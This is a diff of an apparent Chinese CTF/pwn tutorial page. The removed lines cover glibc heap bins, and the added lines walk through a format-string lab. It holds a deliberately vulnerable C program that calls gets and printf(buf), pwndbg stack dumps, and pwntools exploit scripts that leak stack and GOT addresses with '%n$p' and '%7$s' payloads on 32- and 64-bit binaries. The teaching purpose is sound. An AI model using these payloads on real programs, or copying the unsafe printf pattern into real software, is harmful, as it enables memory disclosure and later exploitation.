-</span></span><span class="line"><span class="cl">	<span class="n">mchunkptr</span> <span class="n">last</span> <span class="n">remainder</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">    <span class="cm">/*Nromal bins packed as described above*/</span>
-</span></span><span class="line"><span class="cl">	<span class="n">mchunkptr</span> <span class="n">bins</span><span class="p">[</span><span class="n">NBINS</span> <span class="o">*</span> <span class="mi">2</span> <span class="o">-</span> <span class="mi">2</span><span class="p">];</span>
-</span></span><span class="line"><span class="cl">    <span class="cm">/*Bitmap of bins*/</span>
-</span></span><span class="line"><span class="cl">	<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">binmap</span><span class="p">[</span><span class="n">BINMAPSIZE</span><span class="p">];</span>
-</span></span><span class="line"><span class="cl">    <span class="cm">/*Linked list*/</span>
-</span></span><span class="line"><span class="cl">	<span class="k">struct</span> <span class="n">malloc</span> <span class="n">state</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">    <span class="cm">/*Linked list for free arenas.*/</span>
-</span></span><span class="line"><span class="cl">	<span class="k">struct</span> <span class="n">malloc</span> <span class="n">state</span> <span class="o">*</span><span class="n">next_free</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">	<span class="cm">/* Memory allocated from the system in this arena.*/</span>
-</span></span><span class="line"><span class="cl">	<span class="n">INTERNAL_SIZE_T_system_mem</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">	<span class="n">INTERNAL_SIZE_T_max_system_mem</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span><span class="err">；</span>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">pwndbg&gt; stack 30
+</span></span><span class="line"><span class="cl">00:0000│ esp  0xff842d14 ◂— 0x1000
+</span></span><span class="line"><span class="cl">01:0004│      0xff842d18 —▸ 0x8aea160 ◂— &#39;AAAA\n&#39;
+</span></span><span class="line"><span class="cl">02:0008│      0xff842d1c —▸ 0xf7e1de67 (read+39) ◂— cmp    eax, 0xfffff000 /* &#39;=&#39; */
+</span></span><span class="line"><span class="cl">03:000c│      0xff842d20 —▸ 0xf7d44474 ◂— 0x2dfe
+</span></span><span class="line"><span class="cl">04:0010│      0xff842d24 ◂— 0xffffffff
+</span></span><span class="line"><span class="cl">05:0014│      0xff842d28 —▸ 0xf7dab429 (_IO_doallocbuf+9) ◂— add    ebx, 0x163bd7
+</span></span><span class="line"><span class="cl">06:0018│      0xff842d2c —▸ 0xf7f0f5c0 (_IO_2_1_stdin_) ◂— 0xfbad2088
+</span></span><span class="line"><span class="cl">07:001c│      0xff842d30 —▸ 0xf7daaf07 (_IO_switch_to_get_mode+7) ◂— add    edx, 0x1640f9
+</span></span><span class="line"><span class="cl">08:0020│      0xff842d34 —▸ 0xf7f0d880 (_IO_file_jumps) ◂— 0x0
+</span></span><span class="line"><span class="cl">09:0024│      0xff842d38 —▸ 0xf7f0f5c0 (_IO_2_1_stdin_) ◂— 0xfbad2088
+</span></span><span class="line"><span class="cl">0a:0028│      0xff842d3c —▸ 0xf7daa3f8 (_IO_file_underflow+328) ◂— add    esp, 0x10
+</span></span><span class="line"><span class="cl">0b:002c│      0xff842d40 ◂— 0x0
+</span></span><span class="line"><span class="cl">0c:0030│      0xff842d44 —▸ 0x8aea160 ◂— &#39;AAAA\n&#39;
+</span></span><span class="line"><span class="cl">0d:0034│      0xff842d48 ◂— 0x1000
+</span></span><span class="line"><span class="cl">0e:0038│      0xff842d4c —▸ 0xf7d44474 ◂— 0x2dfe
+</span></span><span class="line"><span class="cl">0f:003c│      0xff842d50 —▸ 0xf7f42ec9 (_dl_lookup_symbol_x+9) ◂— add    eax, 0x1d137
+</span></span><span class="line"><span class="cl">10:0040│      0xff842d54 ◂— 0x7d4
+</span></span><span class="line"><span class="cl">11:0044│      0xff842d58 —▸ 0xf7f0d220 (_IO_helper_jumps) ◂— 0x0
+</span></span><span class="line"><span class="cl">12:0048│      0xff842d5c —▸ 0x8048256 ◂— je     0x80482cd /* &#39;gets&#39; */
+</span></span><span class="line"><span class="cl">13:004c│      0xff842d60 —▸ 0x804a010 (_GLOBAL_OFFSET_TABLE_+16) —▸ 0xf7d9e500 (gets) ◂— push   ebp
+</span></span><span class="line"><span class="cl">14:0050│      0xff842d64 —▸ 0xf7f47fc8 (_dl_fixup+184) ◂— mov    edi, eax
+</span></span><span class="line"><span class="cl">15:0054│      0xff842d68 —▸ 0xf7daa2bb (_IO_file_underflow+11) ◂— add    edi, 0x164d45
+</span></span><span class="line"><span class="cl">16:0058│      0xff842d6c —▸ 0xf7f0f5c0 (_IO_2_1_stdin_) ◂— 0xfbad2088
+</span></span><span class="line"><span class="cl">17:005c│      0xff842d70 —▸ 0xf7f0d880 (_IO_file_jumps) ◂— 0x0
+</span></span><span class="line"><span class="cl">18:0060│      0xff842d74 —▸ 0xf7f0f000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1d7d8c
+</span></span><span class="line"><span class="cl">19:0064│ ebp  0xff842d78 —▸ 0xff842dd8 —▸ 0xff842e38 ◂— 0x0
+</span></span><span class="line"><span class="cl">1a:0068│      0xff842d7c —▸ 0xf7dab51b (_IO_default_uflow+59) ◂— add    esp, 0x10
+</span></span><span class="line"><span class="cl">1b:006c│      0xff842d80 —▸ 0xf7f0f5c0 (_IO_2_1_stdin_) ◂— 0xfbad2088
+</span></span><span class="line"><span class="cl">1c:0070│      0xff842d84 ◂— 0x0
 </span></span></code></pre></td></tr></table>
 </div>
-</div><h3 id="各种内存块介绍">各种内存块介绍
-</h3><p>各种bins：</p>
+</div><p>这里我们可以看栈上有很多残留地址，我们就选ebp下方的：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">1a:0068│      0xff842d7c —▸ 0xf7dab51b (_IO_default_uflow+59) ◂— add    esp, 0x10
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>它的栈地址就是：0xff842d7c</p>
+<blockquote class="alert alert-warn">
+    <blockquote>
+<p>在gdb断点时，我们应要注意要断点在call printf的前面不要超过了它，否则printf就不会生效了。</p>
+</blockquote></blockquote>
+<p>输入：fmtarg 0xff842d7c</p>
+<p><img src="/p/pwn-3/4.png"
+	width="1245"
+	height="295"
+	srcset="/p/pwn-3/4_hu_9fd8297fac69af12.png 480w, /p/pwn-3/4_hu_f7b878068d0b8d6e.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="422"
+		data-flex-basis="1012px"
+	
+></p>
+<p>结果是<code>%25$p</code></p>
+<p>这时候我们改exp：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;i386&#39;</span><span class="p">,</span> <span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&#34;./fmt_32&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">io</span><span class="p">,</span><span class="s2">&#34;b *0x80484F4&#34;</span><span class="p">)</span><span class="c1">#b:break(断点)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;%25$p&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>运行exp，跳出gdb调试界面后，给pwndbg输入c运行printf打印地址：</p>
+<p><img src="/p/pwn-3/5.png"
+	width="1918"
+	height="879"
+	srcset="/p/pwn-3/5_hu_224a6748b48c8ef9.png 480w, /p/pwn-3/5_hu_234097d6b52c55c2.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="218"
+		data-flex-basis="523px"
+	
+></p>
+<p>可以多试几次，地址是随机变化的，但都成功泄露出来了，后续就可以用u32函数打包赋值给一个变量进行储存。</p>
+<h4 id="泄露任意指定地址got-表">泄露任意指定地址（got 表）
+</h4><p>现在到第二种方法，这次加载了elf，因为需要泄露程序内<strong>任意地址</strong></p>
+<p>exp：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;i386&#39;</span><span class="p">,</span> <span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&#34;./fmt_32&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">io</span><span class="p">,</span><span class="s2">&#34;b *0x80484F4</span><span class="se">\n</span><span class="s2">c&#34;</span><span class="p">)</span><span class="c1">#b:break(断点)</span>
+</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./fmt_32&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;printf&#39;</span><span class="p">])</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mi">4</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>现在需要找到格式化字符串的偏移，方法很多，来看第一种也是最简单的，先运行gdb+pwndbg，输入c运行到printf地址断点处：</p>
 <p><img src="/p/pwn-3/6.png"
-	width="1170"
-	height="530"
-	srcset="/p/pwn-3/6_hu_356d3d1f41d3a343.png 480w, /p/pwn-3/6_hu_681cc24595ccc945.png 1024w"
+	width="1918"
+	height="879"
+	srcset="/p/pwn-3/6_hu_77be43da3ec64354.png 480w, /p/pwn-3/6_hu_9f854709c7eac29e.png 1024w"
+	loading="lazy"
+	
+		alt="断点处"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="218"
+		data-flex-basis="523px"
+	
+></p>
+<p>接着用fmtarg格式化字符串索引命令，得到索引偏移：<strong>7 (&quot;%6$p&quot;)</strong></p>
+<p><img src="/p/pwn-3/7.png"
+	width="1918"
+	height="454"
+	srcset="/p/pwn-3/7_hu_3f1b13af2c90b8a2.png 480w, /p/pwn-3/7_hu_73aca8f84b686760.png 1024w"
 	loading="lazy"
 	
 	
 		class="gallery-image" 
-		data-flex-grow="220"
-		data-flex-basis="529px"
+		data-flex-grow="422"
+		data-flex-basis="1013px"
 	
 ></p>
-<h4 id="fastbin">Fastbin
-</h4><p>管理fastbin free chunk，单链表结构，FILO（最后一个进入fastbin链表的，会被放在头部）总共有十个fastbin链表，每个链表中fastbin的size一样，<code>0x10</code>递增。</p>
-<p>大小属于fastbin的chunk被free掉时，不会改变next chunk的prev inuse位，也就是说不会被合并。</p>
-<img src="7.png" alt="Fastbin" style="zoom:175%;" />
-<h4 id="unsortedbin">Unsortedbin
-</h4><p><strong>管理unsorted chunk，只有一个双向链
-表</strong>。所有大小大于fastbin的chunk都会先被暂
-时放入unsortedbin中，链表中的chunk大小不一样。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">00:0000│ esp  0xff912470 —▸ 0xff91248c —▸ 0x804a00c (_GLOBAL_OFFSET_TABLE_+12) —▸ 0x8048356 (printf@plt+6) ◂— push   0 /* &#39;h&#39; */
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>（0xff91248c）在栈上的参数位置是第 7 个。</p>
+<p>😄看得懵懵的吧？顺便给你解释下gdb界面吧：</p>
+<blockquote class="alert alert-note">
+    <blockquote>
+<ol>
+<li>第一层：栈指针 <strong>esp</strong> 指向的地址</li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">00:0000│ esp 0xff912470
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>表示当前栈顶指针 <code>esp</code> 指向的内存地址是 <code>0xff912470</code>（栈顶的第一个位置），这是栈上的一个地址。</p>
+<ol start="2">
+<li>第二层：<strong>0xff912470</strong> 中存储的内容</li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">0xff912470 —▸ 0xff91248c
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>地址 <strong>0xff912470</strong> 里存放的数据是另一个地址 <strong>0xff91248c</strong>（箭头 “—▸” 表示 “指向”）。</p>
+<p>结合场景，<code>0xff91248c</code> 是你输入的格式化字符串 <code>buf</code> 的内存地址（可控的输入缓冲区）。</p>
+<ol start="3">
+<li>第三层：<strong>0xff91248c</strong> 中存储的内容</li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">0xff91248c —▸ 0x804a00c (_GLOBAL_OFFSET_TABLE_+12)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>你的输入缓冲区 <strong>0xff91248c</strong> 里存放的数据是 <strong>0x804a00c</strong>，这个地址属于程序的 <strong>GOT 表（全局偏移表）</strong>，具体是 <code>_GLOBAL_OFFSET_TABLE_</code> 起始地址 + 12 字节的位置（GOT 表用于存储动态链接函数的真实地址）。</p>
+<ol start="4">
+<li>第四层：<strong>0x804a00c</strong> 中存储的内容</li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">0x804a00c —▸ 0x8048356 (printf@plt+6)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>GOT 表中的 <strong>0x804a00c</strong> 里存放的数据是 <strong>0x8048356</strong>，这个地址属于程序的 <strong>PLT 表（过程链接表）</strong>，具体是 <code>printf</code> 函数的 PLT 表入口 + 6 字节的位置（PLT 表是动态链接的 “跳板”，用于间接调用动态函数）。</p>
+<ol start="5">
+<li>最终内容：<strong>0x8048356</strong> 处的指令</li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">0x8048356 (printf@plt+6) ◂— push 0 /* &#39;h&#39; */
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>PLT 表地址 <strong>0x8048356</strong> 处存放的是一条具体的汇编指令：<code>push 0</code>（将立即数 0 压入栈）。这条指令是 <code>printf</code> 函数动态链接过程中的一部分（用于触发动态链接器解析真实地址）。</p>
+</blockquote></blockquote>
+<p>这里就会想到为什么是要<strong>fmtarg 0xff91248c</strong>？我们这个第二种方法是要后续利用漏洞去泄露程序内<strong>任意地址</strong>，而0xffa50c2c是存储着程序的 GOT 表（全局偏移表）的。</p>
 <p><img src="/p/pwn-3/8.png"
-	width="505"
-	height="680"
-	srcset="/p/pwn-3/8_hu_ede4dba4e4677942.png 480w, /p/pwn-3/8_hu_77246d469abdf9c8.png 1024w"
+	width="1344"
+	height="344"
+	srcset="/p/pwn-3/8_hu_cab365c3c576cf10.png 480w, /p/pwn-3/8_hu_949b927b86dd87a1.png 1024w"
 	loading="lazy"
 	
 	
 		class="gallery-image" 
-		data-flex-grow="74"
-		data-flex-basis="178px"
+		data-flex-grow="390"
+		data-flex-basis="937px"
 	
 ></p>
-<p>*<strong>注意：这里的指向箭头比较多</strong></p>
-<h4 id="smallbin">Smallbin
-</h4><p>管理small chunk，由62个双向链表组成，
-每个链表中的chunk大小一样，大小以0x10递
-增。长得和unsortedbin差不多的。</p>
+<p>（0xff91248c）在栈上的参数位置是第 7 个，在这里的eax后面就能看到这个0xff91248c了。那我们用<code>%7$s</code>或者<code>%7$p</code>就能访问到这个地址的内容了。</p>
+<p>改exp：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;i386&#39;</span><span class="p">,</span> <span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&#34;./fmt_32&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./fmt_32&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">io</span><span class="p">,</span><span class="s2">&#34;b *0x80484F4</span><span class="se">\n</span><span class="s2">c&#34;</span><span class="p">)</span><span class="c1">#b:break(断点)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;gets&#39;</span><span class="p">])</span> <span class="o">+</span> <span class="s1">&#39;%7$s&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>p32(elf.got['gets'])</code> 会将 <code>gets@got</code> 地址写入输入缓冲区 <code>0xff91248c</code>，接着<code>%7$p</code> 会告诉 printf：“读取栈上第 7 个参数位置指向的内容”，printf就会输出这个函数的<code>got</code>地址。</p>
+<p><img src="/p/pwn-3/9.png"
+	width="1918"
+	height="878"
+	srcset="/p/pwn-3/9_hu_7b9a57d801410ca5.png 480w, /p/pwn-3/9_hu_3dca8b4790b0bfc7.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="218"
+		data-flex-basis="524px"
+	
+></p>
+<p>可以看到地址（gets@got）泄露了（ctfshow虚拟机好像坏了，我换了台24.04的，源码和exp没改不影响，但gdb的debug不会打印出地址就很奇怪&hellip;）</p>
+<h4 id="64位">64位
+</h4><p>上面是32位的演示案例，接下来看看64位有什么不同？</p>
+<p>编译相同C源代码： <a class="link" href="fmt_64" >fmt_64</a></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span><span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mh">0x30</span><span class="p">];</span> 
+</span></span><span class="line"><span class="cl">    <span class="nf">gets</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">gcc fmt.c -o fmt_64 -g -m64 -no-pie
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>编写exp都差不多，地址记得改：</p>
+<p><img src="/p/pwn-3/10.png"
+	width="865"
+	height="161"
+	srcset="/p/pwn-3/10_hu_27a9fbba99c182bd.png 480w, /p/pwn-3/10_hu_36f4c96f4edc15a3.png 1024w"
+	loading="lazy"
+	
+		alt="call _printf地址:0x4005DB"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="537"
+		data-flex-basis="1289px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span><span class="p">,</span> <span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&#34;./fmt_64&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./fmt_64&#39;</span><span class="p">)</span>  
+</span></span><span class="line"><span class="cl"><span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="s2">&#34;b *0x4005DB</span><span class="se">\n</span><span class="s2">c&#34;</span><span class="p">)</span>  
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;gets&#39;</span><span class="p">])</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;%7$s&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>但是：</p>
+<p><img src="/p/pwn-3/11.png"
+	width="1918"
+	height="878"
+	srcset="/p/pwn-3/11_hu_8ab969c79c69cb81.png 480w, /p/pwn-3/11_hu_b65781a1c5b3956b.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="218"
+		data-flex-basis="524px"
+	
+></p>
+<p>可以发现啥也没泄露&hellip;</p>
+<blockquote class="alert alert-error">
+    <blockquote>
+<p><code>p64(elf.got['gets'])</code> 打包的是 64 位地址（如 <code>0x601028</code>），其字节流为 <code>0x28 0x10 0x60 0x00 0x00 0x00 0x00 0x00</code>（小端序），确实包含多个 <code>0x00</code> 字节（空字符）。</p>
+</blockquote></blockquote>
+<p>因此需要调换位置，<strong>payload = b&rsquo;%7$s&rsquo; + p64(elf.got[&lsquo;gets&rsquo;])</strong></p>
+<p><img src="/p/pwn-3/12.png"
+	width="1854"
+	height="328"
+	srcset="/p/pwn-3/12_hu_7a6f2dfd860178e5.png 480w, /p/pwn-3/12_hu_bcb2a2a40e100ec3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="565"
+		data-flex-basis="1356px"
+	
+></p>
+<p>？？爆null？还不行，错！！！还缺了四个字节，这可是64位程序啊，你b&rsquo;%7$s&rsquo;才4个字节，不成8字节一个单位讷。</p>
+<p>因此exp（<code>b'%7$sAAAA'</code>刚好8字节）：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span><span class="p">,</span> <span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&#34;./fmt_64&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./fmt_64&#39;</span><span class="p">)</span>  
+</span></span><span class="line"><span class="cl"><span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="s2">&#34;b *0x4005DB</span><span class="se">\n</span><span class="s2">c&#34;</span><span class="p">)</span>  
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;%7$sAAAA&#39;</span><span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;gets&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
